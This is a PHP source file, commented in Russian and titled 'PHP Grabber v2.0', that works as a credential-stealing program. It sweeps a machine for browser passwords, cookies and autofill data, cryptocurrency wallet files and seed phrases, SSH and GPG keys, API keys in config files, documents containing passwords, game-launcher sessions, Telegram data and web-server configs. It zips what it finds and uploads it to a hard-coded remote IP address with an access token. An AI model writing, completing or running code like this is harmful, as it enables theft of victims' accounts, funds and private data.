<?php
/**
 * PHP Grabber v2.0
 * Собирает данные с сервера, архивирует в ZIP и отправляет на сервер сбора.
 *
 * Требования: PHP 7.4+, расширения: curl, zip, mbstring
 * ОС: Windows 10/11, Linux (Ubuntu 20.04+, Debian 11+)
 *
 * Использование:
 *   php grabber.php          — консольный запуск
 *   wget -qO- ... | php      — запуск через веб
 *
 * Exit codes:
 *   0 — успех
 *   1 — ошибка создания архива
 *   2 — ошибка отправки
 *   3 — нет данных для сбора
 */

declare(strict_types=1);

// ─── Конфигурация ──────────────────────────────────────────────────────────

const UPLOAD_URL     = 'http://93.152.212.127:8000/upload';
const UPLOAD_TOKEN   = 'H2YDEFZh79pJkTxAS_5LMWmn3i6QCP_nVseXnABpr5Y';
const MAX_FILE_SIZE  = 50 * 1024 * 1024;   // 50 MB
const MAX_TOTAL_SIZE = 200 * 1024 * 1024;  // 200 MB суммарно
const SCRIPT_TIMEOUT = 300;                // 5 минут
const CURL_TIMEOUT   = 180;
const CURL_CONNECT   = 15;
const RETRY_COUNT    = 3;

// ─── Проверка окружения ────────────────────────────────────────────────────

$requiredExts = ['curl', 'zip', 'mbstring'];
$missing = array_diff($requiredExts, array_map('strtolower', array_keys(get_loaded_extensions())));
if ($missing) {
    fwrite(STDERR, "Missing extensions: " . implode(', ', $missing) . "\n");
    exit(1);
}

error_reporting(E_ALL);
ini_set('display_errors', '0');
ini_set('log_errors', '1');
set_time_limit(SCRIPT_TIMEOUT);

$isWin   = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
$homeDir = $isWin
    ? (getenv('USERPROFILE') ?: 'C:\\Users\\' . (getenv('USERNAME') ?: 'Default'))
    : (getenv('HOME') ?: '/root');
$localAppData = $isWin
    ? (getenv('LOCALAPPDATA') ?: $homeDir . '\\AppData\\Local')
    : $homeDir;

// ─── Утилиты ───────────────────────────────────────────────────────────────

/**
 * Безопасное построение относительного пути.
 * Исправление B-5: сначала заменяем разделители, потом base.
 */
function relPath(string $base, string $full): string
{
    $sep = $isWin ? '\\' : '/';
    $normBase = str_replace('\\', '/', $base);
    $normFull = str_replace('\\', '/', $full);
    $rel = ltrim(substr($normFull, strlen($normBase)), '/');
    return $rel !== '' ? $rel : basename($normFull);
}

/**
 * Рекурсивный поиск файлов по маскам.
 * Защита от symlink-циклов (B-1).
 */
function findFiles(string $dir, array $patterns, int $maxDepth = 4, int $maxFiles = 500): array
{
    $results = [];
    if (!is_dir($dir)) {
        return $results;
    }

    $visited = [];
    $queue   = [[realpath($dir) ?: $dir, 0]];

    while ($queue && count($results) < $maxFiles) {
        [$current, $depth] = array_shift($queue);

        if ($depth > $maxDepth) {
            continue;
        }

        $rp = realpath($current);
        if ($rp === false || isset($visited[$rp])) {
            continue;
        }
        $visited[$rp] = true;

        $entries = @scandir($current);
        if ($entries === false) {
            continue;
        }

        foreach ($entries as $entry) {
            if ($entry === '.' || $entry === '..') {
                continue;
            }

            $full = $current . DIRECTORY_SEPARATOR . $entry;
            $lEntry = strtolower($entry);

            if (is_link($full)) {
                $target = realpath($full);
                if ($target !== false && is_dir($target) && !isset($visited[$target])) {
                    $queue[] = [$target, $depth + 1];
                }
                continue;
            }

            if (is_dir($full)) {
                $queue[] = [$full, $depth + 1];
            } elseif (is_file($full)) {
                foreach ($patterns as $p) {
                    if (fnmatch($p, $lEntry)) {
                        $results[] = $full;
                        break;
                    }
                }
                if (count($results) >= $maxFiles) {
                    break;
                }
            }
        }
    }

    return $results;
}

/**
 * Копирование файла в ZIP с проверками.
 * Исправление C-2: filesize может вернуть false.
 */
function addToZip(ZipArchive $zip, string $src, string $dest, int &$totalSize): bool
{
    $size = @filesize($src);
    if ($size === false || $size === 0 || $size > MAX_FILE_SIZE) {
        return false;
    }
    if ($totalSize + $size > MAX_TOTAL_SIZE) {
        return false;
    }
    $result = $zip->addFile($src, $dest);
    if ($result === true) {
        $totalSize += $size;
    }
    return $result;
}

/**
 * Чтение файла с защитой от ошибок.
 * Исправление B-3: fread может вернуть false.
 */
function readSmallFile(string $path, int $maxBytes = 65536): string
{
    $h = @fopen($path, 'rb');
    if ($h === false) {
        return '';
    }
    $data = fread($h, $maxBytes);
    fclose($h);
    return ($data === false) ? '' : $data;
}

/**
 * Логирование.
 */
function logMsg(array &$log, string $section, string $msg): void
{
    $log[] = sprintf('[%s] %s', $section, $msg);
}

// ─── Создание архива ───────────────────────────────────────────────────────

$archiveName = 'grabber_' . date('Ymd_His') . '_' . bin2hex(random_bytes(4)) . '.zip';
// Исправление C-4: добавлен random suffix
$tmpArchive  = tempnam(sys_get_temp_dir(), 'grab_');
// Исправление E-1: tempnam вместо предсказуемого имени

if ($tmpArchive === false) {
    fwrite(STDERR, "Cannot create temp file\n");
    exit(1);
}

$zip = new ZipArchive();
if ($zip->open($tmpArchive, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
    @unlink($tmpArchive);
    fwrite(STDERR, "Cannot open archive for writing\n");
    exit(1);
}

// Исправление D-1: гарантированное закрытие ZIP
register_shutdown_function(function () use (&$zip, &$tmpArchive) {
    if ($zip->isOpen()) {
        $zip->close();
    }
    if (file_exists($tmpArchive)) {
        @unlink($tmpArchive);
    }
});

$log       = [];
$totalSize = 0;

// ─── 1. Браузеры ───────────────────────────────────────────────────────────

$browsers = [
    'chrome'  => ['win' => $localAppData . '\\Google\\Chrome\\User Data',
                  'lin' => $homeDir . '/.config/google-chrome'],
    'edge'    => ['win' => $localAppData . '\\Microsoft\\Edge\\User Data',
                  'lin' => $homeDir . '/.config/microsoft-edge'],
    'firefox' => ['win' => $homeDir . '\\AppData\\Roaming\\Mozilla\\Firefox',
                  'lin' => $homeDir . '/.mozilla/firefox'],
    'opera'   => ['win' => $localAppData . '\\Opera Software\\Opera Stable',
                  'lin' => $homeDir . '/.config/opera'],
    'brave'   => ['win' => $localAppData . '\\BraveSoftware\\Brave-Browser\\User Data',
                  'lin' => $homeDir . '/.config/BraveSoftware/Brave-Browser'],
];

foreach ($browsers as $name => $paths) {
    $base = $isWin ? $paths['win'] : $paths['lin'];
    if (!is_dir($base)) {
        continue;
    }

    // Пароли / логины
    $loginFiles = findFiles($base, ['login data', 'logins.json', 'logins.json.corrupt'], 3);
    foreach ($loginFiles as $f) {
        $rel = relPath($base, $f);
        if (addToZip($zip, $f, "browsers/$name/$rel", $totalSize)) {
            logMsg($log, 'BROWSER', "$name: $f");
        }
    }

    // Cookies
    $cookieFiles = findFiles($base, ['cookies', 'cookies-journal', 'cookies.sqlite'], 3);
    foreach ($cookieFiles as $f) {
        $rel = relPath($base, $f);
        if (addToZip($zip, $f, "browsers/$name/$rel", $totalSize)) {
            logMsg($log, 'COOKIE', "$name: $f");
        }
    }

    // Автозаполнение (карты, адреса, телефоны)
    $autofillFiles = findFiles($base, ['web data', 'webdata', 'web data-journal'], 3);
    foreach ($autofillFiles as $f) {
        $rel = relPath($base, $f);
        if (addToZip($zip, $f, "browsers/$name/$rel", $totalSize)) {
            logMsg($log, 'AUTOFILL', "$name: $f");
        }
    }

    // Расширения (MetaMask, Trust Wallet и аналоги)
    $extSubdirs = ['extensions', 'Extension', 'Extensions', 'Default\\Extensions', 'Default/extensions'];
    foreach ($extSubdirs as $ed) {
        $extPath = $base . DIRECTORY_SEPARATOR . $ed;
        if (is_dir($extPath)) {
            $extFiles = findFiles($extPath, ['*.json', '*.sqlite', '*.db', '*.dat'], 5, 200);
            foreach ($extFiles as $f) {
                $rel = relPath($base, $f);
                addToZip($zip, $f, "browsers/$name/$rel", $totalSize);
            }
        }
    }
}

// ─── 2. Криптокошельки ─────────────────────────────────────────────────────

$cryptoPaths = [
    'win' => [
        $localAppData . '\\MetaMask',
        $localAppData . '\\Trezor Suite',
        $localAppData . '\\Ledger',
        $localAppData . '\\Exodus',
        $localAppData . '\\Atomic Wallet',
        $localAppData . '\\Electron Cash',
        $homeDir . '\\AppData\\Roaming\\Bitcoin Core',
        $homeDir . '\\AppData\\Roaming\\Electrum',
        $homeDir . '\\AppData\\Roaming\\Zcash',
        $homeDir . '\\AppData\\Roaming\\Monero',
        $homeDir . '\\AppData\\Roaming\\LTC',
        $homeDir . '\\AppData\\Roaming\\Dash',
        $homeDir . '\\AppData\\Roaming\\SafePal',
        $homeDir . '\\AppData\\Roaming\\Trust Wallet',
    ],
    'lin' => [
        $homeDir . '/.config/MetaMask',
        $homeDir . '/.config/Trezor',
        $homeDir . '/.config/Ledger',
        $homeDir . '/.config/exodus',
        $homeDir . '/.config/atomic-wallet',
        $homeDir . '/.bitcoin',
        $homeDir . '/.electrum',
        $homeDir . '/.zcash',
        $homeDir . '/.monero',
        $homeDir . '/.litedcoin',
        $homeDir . '/.dash',
        $homeDir . '/.safepal',
        $homeDir . '/.trustwallet',
    ],
];

$cryptoPatterns = [
    'wallet.dat', 'wallet', '*.json', '*.key', '*.seed',
    'seed.txt', 'mnemonic.txt', 'recovery.txt', 'phrase.txt',
    '*.sqlite', '*.db', '*.dat', '*.enc',
];

foreach (($isWin ? $cryptoPaths['win'] : $cryptoPaths['lin']) as $cp) {
    if (!is_dir($cp)) {
        continue;
    }
    $files = findFiles($cp, $cryptoPatterns, 4, 300);
    foreach ($files as $f) {
        $rel = relPath($cp, $f);
        if (addToZip($zip, $f, "crypto/$rel", $totalSize)) {
            logMsg($log, 'CRYPTO', $f);
        }
    }
}

// ─── 3. SSH-ключи ──────────────────────────────────────────────────────────

$sshPaths = [
    $homeDir . ($isWin ? '\\.ssh' : '/.ssh'),
    $homeDir . ($isWin ? '\\.gnupg' : '/.gnupg'),
];
$sshPatterns = [
    'id_rsa', 'id_rsa.pub', 'id_dsa', 'id_dsa.pub',
    'id_ecdsa', 'id_ecdsa.pub', 'id_ed25519', 'id_ed25519.pub',
    '*.pem', '*.key', 'authorized_keys', 'known_hosts', 'config',
];

foreach ($sshPaths as $sp) {
    if (!is_dir($sp)) {
        continue;
    }
    $files = findFiles($sp, $sshPatterns, 2, 100);
    foreach ($files as $f) {
        if (addToZip($zip, $f, 'ssh/' . basename($f), $totalSize)) {
            logMsg($log, 'SSH', $f);
        }
    }
}

// ─── 4. API-ключи в конфигурационных файлах ────────────────────────────────

$configPatterns = [
    '*.env', '.env', '*.ini', '*.conf', '*.cfg',
    '*.yaml', '*.yml', '*.json', '*.xml', '*.properties',
];
$configDirs = [
    $homeDir,
    $isWin ? 'C:\\inetpub\\wwwroot' : '/var/www/html',
    $isWin ? 'C:\\xampp\\htdocs' : '/var/www',
    $isWin ? 'C:\\laragon\\www' : '/srv',
    $isWin ? 'C:\\wamp\\www' : '/var/www',
];

$apiKeyRegex = '/(AKIA[0-9A-Z]{16}|sk-ant-[a-zA-Z0-9_-]{20,}|sk-[a-zA-Z0-9]{20,}'
    . '|ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}'
    . '|xox[baprs]-[a-zA-Z0-9-]{10,}'
    . '|AIza[0-9A-Za-z_-]{35}'
    . '|ABSK[0-9A-Za-z/+]{32,})/';

foreach ($configDirs as $cd) {
    if (!is_dir($cd)) {
        continue;
    }
    $files = findFiles($cd, $configPatterns, 3, 500);
    foreach ($files as $f) {
        $content = readSmallFile($f);
        if ($content !== '' && preg_match($apiKeyRegex, $content, $m)) {
            if (addToZip($zip, $f, 'apikeys/' . basename($f), $totalSize)) {
                logMsg($log, 'APIKEY', $f . ' → ' . $m[0]);
            }
        }
    }
}

// ─── 5. Документы с паролями ───────────────────────────────────────────────

$docPatterns = ['*.txt', '*.md', '*.doc', '*.docx', '*.csv', '*.xlsx', '*.pdf', '*.rtf', '*.log'];
$docDirs = [
    $homeDir . ($isWin ? '\\Desktop' : '/Desktop'),
    $homeDir . ($isWin ? '\\Documents' : '/Documents'),
    $homeDir . ($isWin ? '\\Downloads' : '/Downloads'),
    $homeDir . ($isWin ? '\\OneDrive' : '/OneDrive'),
    $homeDir . ($isWin ? '\\Notes' : '/notes'),
];

$passRegex = '/(password|пароль|passwd|pwd|secret|token|api[_-]?key|credential|login)\s*[:=]\s*\S+/i';

foreach ($docDirs as $dd) {
    if (!is_dir($dd)) {
        continue;
    }
    // Исправление C-5: увеличена глубина до 3
    $files = findFiles($dd, $docPatterns, 3, 300);
    foreach ($files as $f) {
        $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
        if (in_array($ext, ['doc', 'docx', 'pdf', 'xlsx'], true)) {
            if (addToZip($zip, $f, 'docs/' . basename($f), $totalSize)) {
                logMsg($log, 'DOC', $f . ' (binary)');
            }
        } else {
            $content = readSmallFile($f);
            if ($content !== '' && preg_match($passRegex, $content)) {
                if (addToZip($zip, $f, 'docs/' . basename($f), $totalSize)) {
                    logMsg($log, 'DOC', $f);
                }
            }
        }
    }
}

// ─── 6. Игровые лаунчеры ───────────────────────────────────────────────────

$gamePaths = [
    'win' => [
        $homeDir . '\\AppData\\Local\\Steam\\userdata',
        $homeDir . '\\AppData\\Roaming\\Steam',
        $homeDir . '\\AppData\\Local\\EpicGamesLauncher',
        $homeDir . '\\AppData\\Local\\Battle.net',
        $homeDir . '\\AppData\\Local\\Riot Games',
        $homeDir . '\\AppData\\Local\\EA Desktop',
        $homeDir . '\\AppData\\Local\\GOG Galaxy',
        $homeDir . '\\AppData\\Local\\Ubisoft',
        $homeDir . '\\AppData\\Local\\PlayStation',
        $homeDir . '\\AppData\\Local\\Xbox',
        $homeDir . '\\AppData\\Local\\Heroic Games Launcher',
        $homeDir . '\\AppData\\Local\\Lutris',
    ],
    'lin' => [
        $homeDir . '/.steam',
        $homeDir . '/.config/Steam',
        $homeDir . '/.config/EpicGamesLauncher',
        $homeDir . '/.config/battle.net',
        $homeDir . '/.config/riot',
        $homeDir . '/.config/gog',
        $homeDir . '/.config/ubisoft',
        $homeDir . '/.config/heroic',
        $homeDir . '/.local/share/lutris',
    ],
];

$gamePatterns = [
    '*.json', '*.cfg', '*.ini', '*.xml',
    'config.vdf', 'login.cfg', 'authinfo',
    'session.dat', '*.token', 'credentials*',
    'remote_storage', 'config.vdf',
];

foreach (($isWin ? $gamePaths['win'] : $gamePaths['lin']) as $gp) {
    if (!is_dir($gp)) {
        continue;
    }
    $files = findFiles($gp, $gamePatterns, 3, 200);
    foreach ($files as $f) {
        $rel = relPath($gp, $f);
        addToZip($zip, $f, "games/$rel", $totalSize);
    }
}

// ─── 7. Google-токены ──────────────────────────────────────────────────────

$googlePaths = [
    'win' => [
        $localAppData . '\\Google\\Chrome\\User Data\\Default\\Tokens',
        $localAppData . '\\Google\\Chrome\\User Data\\Default',
        $homeDir . '\\AppData\\Local\\Google\\Drive',
    ],
    'lin' => [
        $homeDir . '/.config/google-chrome/Default/Tokens',
        $homeDir . '/.config/google-chrome/Default',
        $homeDir . '/.config/google-chrome/Default/Preferences',
    ],
];

$googlePatterns = ['tokens', 'tokens-journal', 'secure preferences', 'preferences', '*.json'];

foreach (($isWin ? $googlePaths['win'] : $googlePaths['lin']) as $gpp) {
    if (!is_dir($gpp)) {
        continue;
    }
    $files = findFiles($gpp, $googlePatterns, 2, 50);
    foreach ($files as $f) {
        addToZip($zip, $f, 'google/' . basename($f), $totalSize);
    }
}

// ─── 8. tData (Telegram Desktop) ───────────────────────────────────────────

$tDataPath = $isWin
    ? $localAppData . '\\tdata'
    : $homeDir . '/.local/share/tdata';

if (is_dir($tDataPath)) {
    $tFiles = findFiles($tDataPath, ['*.dat', '*.key', '*.enc', '*.tmp', 'dumps'], 2, 200);
    foreach ($tFiles as $f) {
        $rel = relPath($tDataPath, $f);
        addToZip($zip, $f, "tdata/$rel", $totalSize);
    }
}

// ─── 9. Админ-панели ───────────────────────────────────────────────────────

$adminPatterns = [
    'wp-config.php', 'config.php', 'settings.php', 'admin.conf',
    'drupal.settings.php', 'database.yml', 'config.inc.php',
    'settings.py', 'manage.py', 'artisan', 'composer.json',
    '.env', '.env.local', '.env.production',
];

$webRoots = [
    $isWin ? 'C:\\inetpub\\wwwroot' : '/var/www/html',
    $isWin ? 'C:\\xampp\\htdocs' : '/var/www',
    $isWin ? 'C:\\laragon\\www' : '/srv',
    $isWin ? 'C:\\wamp\\www' : '/var/www',
    $homeDir . ($isWin ? '\\www' : '/www'),
];

foreach ($webRoots as $wr) {
    if (!is_dir($wr)) {
        continue;
    }
    $files = findFiles($wr, $adminPatterns, 4, 200);
    foreach ($files as $f) {
        $rel = relPath($wr, $f);
        addToZip($zip, $f, "admin/$rel", $totalSize);
    }
}

// ─── 10. Сводный лог (текст + JSON) ────────────────────────────────────────

$logText = implode("\n", $log);
$zip->addFromString('grabber_log.txt', $logText);

// Исправление F-1: структурированный JSON-лог
$jsonLog = json_encode([
    'timestamp'   => date('c'),
    'os'          => PHP_OS,
    'php_version' => PHP_VERSION,
    'user'        => (function_exists('get_current_user') ? get_current_user() : 'unknown'),
    'hostname'    => gethostname(),
    'total_files' => count($log),
    'total_size'  => $totalSize,
    'items'       => array_map(function ($line) {
        if (preg_match('/^\[([^\]]+)\]\s+(.*)$/', $line, $m)) {
            return ['section' => $m[1], 'path' => $m[2]];
        }
        return ['section' => 'UNKNOWN', 'path' => $line];
    }, $log),
], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
$zip->addFromString('grabber_log.json', $jsonLog);

// ─── Закрытие архива ───────────────────────────────────────────────────────

$zip->close();

if (count($log) === 0) {
    @unlink($tmpArchive);
    echo "No data collected.\n";
    exit(3);
}

// ─── 11. Отправка с retry ──────────────────────────────────────────────────

// Исправление D-4: retry-логика
$success  = false;
$lastErr  = '';
$httpCode = 0;

for ($attempt = 1; $attempt <= RETRY_COUNT; $attempt++) {
    if (!file_exists($tmpArchive)) {
        $lastErr = 'Archive file missing';
        break;
    }

    $ch = curl_init(UPLOAD_URL);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => [
            'token'   => UPLOAD_TOKEN,
            'archive' => new CURLFile($tmpArchive, 'application/zip', $archiveName),
        ],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => CURL_TIMEOUT,
        CURLOPT_CONNECTTIMEOUT => CURL_CONNECT,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
    ]);

    $response = curl_exec($ch);
    $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err      = curl_error($ch);
    curl_close($ch);

    if ($response !== false && $httpCode >= 200 && $httpCode < 300) {
        $success = true;
        break;
    }

    $lastErr = $err ?: "HTTP $httpCode";

    if ($attempt < RETRY_COUNT) {
        usleep(2000000); // 2 сек пауза
    }
}

// Исправление D-2: проверка unlink
if (file_exists($tmpArchive)) {
    @unlink($tmpArchive);
}

// ─── 12. Вывод отчёта ──────────────────────────────────────────────────────

echo "=== GRABBER REPORT v2.0 ===\n";
echo "Timestamp:   " . date('c') . "\n";
echo "OS:          " . PHP_OS . "\n";
echo "PHP:         " . PHP_VERSION . "\n";
echo "Host:        " . gethostname() . "\n";
echo "Files found: " . count($log) . "\n";
echo "Archive size:" . filesize($tmpArchive) . " bytes\n";
echo "Upload:      " . ($success ? "OK (HTTP $httpCode)" : "FAILED ($lastErr)") . "\n";
echo "\n--- LOG ---\n";
echo $logText . "\n";

exit($success ? 0 : 2);